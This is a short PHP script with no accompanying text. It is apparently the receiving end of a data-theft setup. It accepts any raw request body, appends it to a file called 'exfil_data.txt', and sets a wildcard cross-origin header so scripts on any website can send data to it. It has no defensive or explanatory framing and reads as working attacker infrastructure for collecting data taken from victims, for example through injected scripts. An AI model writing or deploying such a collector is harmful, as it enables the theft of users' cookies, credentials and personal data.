<?php
$data = file_get_contents('php://input');
file_put_contents('exfil_data.txt', $data . "\n", FILE_APPEND);
header("Access-Control-Allow-Origin: *");
echo "OK";
?>
